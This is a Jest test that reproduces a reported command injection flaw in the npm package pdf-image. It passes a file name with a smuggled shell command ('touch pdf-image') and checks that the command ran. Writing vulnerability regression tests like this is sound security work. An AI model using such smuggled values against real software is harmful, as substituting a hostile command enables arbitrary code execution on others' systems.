//https://hackerone.com/reports/340208
test("Command Injection in pdf-image", () => {
  expect.assertions(2);
  const PDFImage = require("pdf-image").PDFImage;
  const fs = require("fs");
  const path = "./pdf-image";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let pdfImage = new PDFImage('asd.pdf"; touch pdf-image"');
  try {
    return pdfImage.numberOfPages().then(function (imagePath) {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
  } catch (e) {}
});
